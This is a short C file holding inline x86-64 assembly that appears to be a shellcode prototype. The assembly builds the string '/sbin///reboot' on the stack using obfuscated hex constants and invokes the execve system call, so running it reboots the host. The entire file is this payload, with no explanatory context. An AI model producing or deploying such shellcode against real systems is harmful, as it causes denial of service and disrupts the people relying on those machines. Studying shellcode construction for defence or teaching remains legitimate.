//movabs $0x613b746f6f626572,%rdi
int main()
{
    __asm__(
    "xor %rax,%rax\n\t"
    "xor %rdi,%rdi\n\t"
    "xor %rsi,%rsi\n\t"
    "xor %rdx,%rdx\n\t"
    "mov $0x3b,%al\n\t"
    "push %rdi\n\t"
    "movabs $0x746f6f6265722f2f,%rdi\n\t"
    "push %rdi\n\t"
    "movabs $0x2f2f2f6e6962732f,%rdi\n\t"
    "push %rdi\n\t"
    "mov %rsp,%rdi\n\t"
    "syscall"
    );
}